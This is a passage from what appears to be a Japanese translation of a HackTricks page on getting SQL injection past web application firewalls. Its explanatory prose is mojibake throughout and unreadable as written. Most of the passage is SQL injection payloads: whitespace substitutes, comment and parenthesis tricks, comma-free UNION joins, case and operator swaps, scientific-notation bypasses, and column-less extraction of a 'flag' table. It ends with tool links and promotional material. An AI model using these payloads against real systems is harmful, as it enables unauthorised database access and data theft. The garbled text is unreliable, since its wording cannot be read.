ã‚¹ãƒšãƒ¼ã‚¹ãªã— (%20) - ç©ºç™½ã®ä»£æ›¿æ‰‹æ®µã‚’ä½¿ç”¨ã—ãŸãƒã‚¤ãƒ‘ã‚¹
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
### No Whitespace - ã‚³ãƒ¡ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹

æ”»æ’ƒè€…ã¯ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹éš›ã«ã€SQLã‚¯ã‚¨ãƒªå†…ã®ã‚¹ãƒšãƒ¼ã‚¹ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã€ã‚³ãƒ¡ãƒ³ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚³ãƒ¡ãƒ³ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€SQLã‚¯ã‚¨ãƒªã®ä¸€éƒ¨ã‚’ç„¡åŠ¹ã«ã—ã€æ”»æ’ƒè€…ãŒæ„å›³ã—ãŸã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã¨ãªã‚Šã¾ã™ã€‚

ä¾‹ãˆã°ã€ä»¥ä¸‹ã®ã‚ˆã†ãªSQLã‚¯ã‚¨ãƒªãŒã‚ã‚‹ã¨ã—ã¾ã™ï¼š

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```

æ”»æ’ƒè€…ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚³ãƒ¡ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¹ãƒšãƒ¼ã‚¹ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

```sql
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'password'
```

ã“ã®ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã€`AND password = 'password'` ã®éƒ¨åˆ†ãŒã‚³ãƒ¡ãƒ³ãƒˆã¨ã—ã¦ç„¡è¦–ã•ã‚Œã€æ”»æ’ƒè€…ãŒä»»æ„ã®æ¡ä»¶ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã¨ãªã‚Šã¾ã™ã€‚
```sql
?id=1/*comment*/and/**/1=1/**/--
```
### No Whitespace - ãƒ‘ãƒ¼ãƒ¬ãƒ³ã‚·ã‚¹ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒæ™‚ã«ã‚¹ãƒšãƒ¼ã‚¹ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚é€šå¸¸ã€SQLæ–‡ã®ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã¨è­˜åˆ¥å­ã®é–“ã«ã‚¹ãƒšãƒ¼ã‚¹ãŒå¿…è¦ã§ã™ãŒã€ãƒ‘ãƒ¼ãƒ¬ãƒ³ã‚·ã‚¹ï¼ˆæ‹¬å¼§ï¼‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã‚¹ãƒšãƒ¼ã‚¹ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã‚’å®Ÿè¡Œã—ã€ç›®çš„ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã¨ãªã‚Šã¾ã™ã€‚
```sql
?id=(1)and(1)=(1)--
```
### ã‚³ãƒ³ãƒã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹

ã‚ªãƒ•ã‚»ãƒƒãƒˆã€FROMã€JOINã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ³ãƒã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### ä¸€èˆ¬çš„ãªãƒã‚¤ãƒ‘ã‚¹

ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ãŸãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆ - å¤§æ–‡å­—/å°æ–‡å­—ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ‘ã‚¹
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
### ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ã£ãŸãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã¯å¤§æ–‡å­—å°æ–‡å­—ã‚’åŒºåˆ¥ã—ãªã„ - åŒç­‰ã®æ¼”ç®—å­ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### ç§‘å­¦çš„è¡¨è¨˜ WAF ãƒã‚¤ãƒ‘ã‚¹

ã“ã®ãƒˆãƒªãƒƒã‚¯ã®è©³ç´°ãªèª¬æ˜ã¯ã€[gosecure ãƒ–ãƒ­ã‚°](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
åŸºæœ¬çš„ã«ã€WAF ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«äºˆæœŸã—ãªã„æ–¹æ³•ã§ç§‘å­¦çš„è¡¨è¨˜ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### ã‚«ãƒ©ãƒ åã®åˆ¶é™ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹

ã¾ãšæœ€åˆã«ã€ã‚‚ã—**å…ƒã®ã‚¯ã‚¨ãƒªã¨ãƒ•ãƒ©ã‚°ã‚’æŠ½å‡ºã—ãŸã„ãƒ†ãƒ¼ãƒ–ãƒ«ãŒåŒã˜æ•°ã®ã‚«ãƒ©ãƒ ã‚’æŒã£ã¦ã„ã‚‹**å ´åˆã¯ã€å˜ã«æ¬¡ã®ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™: `0 UNION SELECT * FROM flag`

ã‚«ãƒ©ãƒ åã‚’ä½¿ç”¨ã›ãšã«**ãƒ†ãƒ¼ãƒ–ãƒ«ã®3ç•ªç›®ã®ã‚«ãƒ©ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½**ã§ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ãªã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¾ã™: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`ã€ã—ãŸãŒã£ã¦ã€ã“ã‚Œã¯sqlinjectionã§ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
ã¾ãŸã¯ã€**ã‚«ãƒ³ãƒãƒã‚¤ãƒ‘ã‚¹**ã‚’ä½¿ç”¨ã™ã‚‹ï¼š
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
ã“ã®ãƒˆãƒªãƒƒã‚¯ã¯[https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)ã‹ã‚‰å–å¾—ã•ã‚Œã¾ã—ãŸã€‚

### WAF ãƒã‚¤ãƒ‘ã‚¹ææ¡ˆãƒ„ãƒ¼ãƒ«

{% embed url="https://github.com/m4ll0k/Atlas" %}

## ãã®ä»–ã®ã‚¬ã‚¤ãƒ‰

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ¤œå‡ºãƒªã‚¹ãƒˆ

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) ã¯**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§ã‚‚æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çš„çŸ¥è­˜ã®ä¿ƒé€²ã‚’ä½¿å‘½**ã¨ã™ã‚‹ã“ã®ä¼šè­°ã¯ã€ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å°‚é–€å®¶ã«ã¨ã£ã¦ã®ç†±ã„å‡ºä¼šã„ã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricks ã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASS ã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¾ã™
* [**å…¬å¼ PEASS & HackTricks ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã™
* **ğŸ’¬** [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¾ã™**ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[hacktricks ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks) ã¨ [hacktricks-cloud ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)** ã« PR ã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
